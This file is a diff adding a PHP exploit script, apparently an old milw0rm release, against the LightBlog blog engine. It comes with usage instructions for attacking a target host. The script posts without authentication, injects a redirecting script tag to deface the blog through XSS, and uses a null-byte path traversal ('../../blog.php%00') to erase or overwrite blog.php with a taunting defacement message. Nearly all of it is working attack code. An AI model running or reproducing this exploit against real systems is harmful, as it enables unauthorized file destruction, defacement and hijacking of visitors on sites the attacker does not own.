@@ -1,0 +1,218 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "\r\n";
+echo "Light Blog Multiple Vulnerabilities Exploit\r\n";
+echo "by BlackHawk <hawkgotyou@gmail.com>\r\n";
+echo "Thanks to rgod for the php code and Marty for the Love\r\n\r\n";
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." Site Path AttackType Related\r\n";
+echo "Host:             target server (ip/hostname)\r\n";
+echo "Path:             path to LightBlog\r\n";
+echo "AttackType:       1 - Create New Post (Title must be of one word)\r\n";
+echo "            |-> Related: Title Post\r\n";
+echo "            |-> Es: php ".$argv[0]." localhost /blog/ 1 Hacked I Got You\r\n\r\n";
+echo "          2 - Deface Blog (With XSS)\r\n";
+echo "            |-> Related: WebPage\r\n";
+echo "            |-> Es: php ".$argv[0]." localhost /blog/ 2 http://site.com/\r\n\r\n";
+echo "          3 - Deface Blog (Deleting blog.php)\r\n";
+echo "            |-> Related: NickName\r\n";
+echo "            |-> Es: php ".$argv[0]." localhost /blog/ 3 BlackHawk\r\n\r\n";
+echo "";
+echo "\r\n";
+echo "";
+die;
+}
+
+/*
+There are some critical vulnerabilities in this quite simple Blog Engine..
+
+1 - You do not need to know the right password to send a new Post (no cecking);
+2 - You can erase (even with mq=on) all file that are stored on the server:
+
+[...]
+$t = stripslashes($t);
+[...]
+$fc = fopen ("blog_comments/$t.txt", "w");
+fwrite ($fc, "");
+[...]
+
+3-Using point No 1 you can do some XSS couse there isn't any anti-Xss code for admins
+4-If mq=on than you can deface the site (but no injecting PHP cause < and > are properly parsed)
+
+sorry for my bad english,
+
+BlackHawk hawkgotyou@gmail.com
+*/
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+ $result='';$exa='';$cont=0;
+ for ($i=0; $i<=strlen($string)-1; $i++)
+ {
+  if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+  {$result.="  .";}
+  else
+  {$result.="  ".$string[$i];}
+  if (strlen(dechex(ord($string[$i])))==2)
+  {$exa.=" ".dechex(ord($string[$i]));}
+  else
+  {$exa.=" 0".dechex(ord($string[$i]));}
+  $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+ }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+ global $proxy, $host, $port, $html, $proxy_regex;
+ if ($proxy=='') {
+   $ock=fsockopen(gethostbyname($host),$port);
+   if (!$ock) {
+     echo 'No response from '.$host.':'.$port; die;
+   }
+ }
+ else {
+       $c = preg_match($proxy_regex,$proxy);
+   if (!$c) {
+     echo 'Not a valid proxy...';die;
+   }
+   $parts=explode(':',$proxy);
+   echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+   $ock=fsockopen($parts[0],$parts[1]);
+   if (!$ock) {
+     echo 'No response from proxy...';die;
+       }
+ }
+ fputs($ock,$packet);
+ if ($proxy=='') {
+   $html='';
+   while (!feof($ock)) {
+     $html.=fgets($ock);
+   }
+ }
+ else {
+   $html='';
+   while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+     $html.=fread($ock,1);
+   }
+ }
+ fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$attack_type=$argv[3];
+$port=80;
+$proxy="";
+
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+switch($attack_type)
+{
+case 1: //Insert New Post
+$title=$argv[4];
+$message="";
+for ($i=5; $i<=$argc-1; $i++){
+$message.=" ".$argv[$i];
+}
+$title=urlencode($title);
+$message=urlencode($message);
+echo "Attack No 1 - Sending New Post..\r\n";
+$data="t=$title";
+$data.="&c=$message";
+$data.="&Submit=Post";
+$packet="POST ".$p."LightBlog/blog_script.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Referer: http://".$host.$path."/blog.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+echo "Ok, Post Sent";
+break;
+
+case 2: // Deface With XSS
+$dfc_url=$argv[4];
+$deface_url=urlencode("<script>window.location=('$dfc_url')</script>");
+echo "Attack No 2 - Sending New Post With XSS..\r\n";
+$data="t=$deface_url";
+$data.="&c=msg";
+$data.="&Submit=Post";
+$packet="POST ".$p."LightBlog/blog_script.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Referer: http://".$host.$path."/blog.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+echo "Ok, Post Sent";
+break;
+
+break;
+case 3: // Defacing the original blog.php file
+$nickname=$argv[4];
+$packet ="GET ".$p."LightBlog/blog_comments.php?comment=Comment&title=title HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("name=\"rand\" id=\"rand\" value=\"",$html);
+$temp2=explode("\"></input>",$temp[1]);
+$random_code = $temp2[0];
+$temp=explode("name=\"rand\" id=\"rand\" value=\"$random_code\"></input>",$html);
+$temp2=explode(" ",$temp[1]);
+$small_code = $temp2[0];
+
+
+$data="t=../../blog.php%00";
+$data.="&c=ciao";
+$data.="&Submit=Post";
+$packet="POST ".$p."/LightBlog/blog_script.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Referer: http://".$host.$path."/blog.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+echo "blog.php File erased\r\n";
+
+// This part will work only if mq=off elsewhere the exploit will only delete blog.php
+$deface_text=urlencode("|:. $nickname got you! .:");
+$signature=urlencode(" BlackHawk And Piggy-Marty Rulez info --> <hawkgotyou@gmail.com>");
+$packet ="GET ".$p."LightBlog/add_comment_script.php?name=$deface_text&comment=$signature&rand=$random_code&val=$small_code&Submit=Submit&title=../../blog.php/%00 HTTP/1.0\r\n";
+$packet.="Referer: http://".$host.$path."blog.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+echo "Ok, Blog Defaced";
+break;
+}
+?>
+
+# milw0rm.com [2006-10-27]
